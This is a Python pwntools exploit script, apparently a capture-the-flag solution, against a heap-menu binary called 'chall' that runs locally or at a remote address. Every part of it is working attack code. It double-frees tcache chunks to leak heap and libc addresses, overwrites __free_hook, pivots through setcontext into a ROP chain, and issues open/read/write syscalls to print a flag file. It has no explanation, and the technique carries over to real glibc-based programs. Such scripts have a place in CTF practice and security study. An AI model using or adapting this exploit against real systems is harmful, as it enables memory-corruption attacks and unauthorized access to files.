#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
debug = 1
context(arch='amd64', endian='el', os='linux')
context.log_level = 'debug'
if debug == 1:
    p = process(['./chall'])
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('52.152.231.198', 8081)
    libc = ELF('./libc-2.27.so', checksec=False)
elf = ELF('./chall', checksec=False)
def add(size):
    p.sendlineafter("Your choice: ","1")
    p.sendlineafter("Index: ",str(0))
    p.sendlineafter("Size: ",str(size)) #<0x78
def edit(content):
    p.sendlineafter("Your choice: ","2")
    p.sendlineafter("Index: ",str(0))
    p.sendlineafter("Content: ",content)
    
def show():
    p.sendlineafter("Your choice: ","3")
    p.sendlineafter("Index: ",str(0))
    p.recvuntil("Content: ")
def free():
    p.sendlineafter("Your choice: ","4")
    p.sendlineafter("Index: ",str(0))
add(0x30)
free()
edit(p64(0)*2)
free()
show()
heap_base = u64(p.recv(6).ljust(8,"\x00")) - 0x1920
add(0x30)
add(0x30)
add(0x30)
free()
add(0x40)
p.sendlineafter("Your choice: ","1")
p.sendlineafter("Index: ", '1' * 0x410)
add(0x30)
show()
libc.address = u64(p.recv(6).ljust(8,"\x00")) - 176 - 0x10 - libc.sym['__malloc_hook']
free_hook = libc.sym['__free_hook']
setcontext = libc.sym['setcontext']
open_ = libc.sym['open'] + 0x20
write = libc.sym['write'] + 0x20
read = libc.sym['read'] + 0x20
pop_rdi = libc.address + 0x00000000000215bf + 0x20
pop_rsi = libc.address + 0x0000000000023eea + 0x20
pop_rdx = libc.address + 0x0000000000001b96 + 0x20
pop_rsp = libc.address + 0x0000000000003960 + 0x20
pop_rax = libc.address + 0x0000000000043ae8 + 0x20
syscall = libc.address + 0xE4345 + 0x20 
#.text:00000000000E4345                 syscall                 ; LINUX - sys_times
add(0x10)
free()
edit(p64(0)*2)
free()
add(0x10)
edit(p64(free_hook + 0xa0 + 0x10))
add(0x10)
add(0x10)
edit(p64(heap_base + 0x18c0) + p64(pop_rsp))
#gdb.attach(p)
add(0x50)
edit(p64(heap_base + 0xe98))
add(0x78)
free()
edit(p64(0)*2)
free()
add(0x78)
edit(p64(free_hook + 0x10))
add(0x78)
pd = "./flag"
pd = pd.ljust(8,'\x00')
pd += p64(pop_rdi) + p64(0)
pd += p64(pop_rsi) + p64(heap_base + 0xe98 + 0x38)
pd += p64(pop_rdx) + p64(0x100)
pd += p64(read)
edit(pd)
add(0x78)
edit(p64(setcontext + 0x35 + 0x20))
free()
pd = p64(pop_rdi) + p64(heap_base + 0xe90)
pd += p64(pop_rax) + p64(2)
pd += p64(pop_rsi) + p64(0)
pd += p64(syscall)
pd += p64(pop_rdi) + p64(3)
pd += p64(pop_rsi) + p64(heap_base + 0x2000)
pd += p64(pop_rdx) + p64(0x200)
pd += p64(read)
pd += p64(pop_rdi) + p64(1)
pd += p64(write)
p.sendline(pd)
p.interactive()

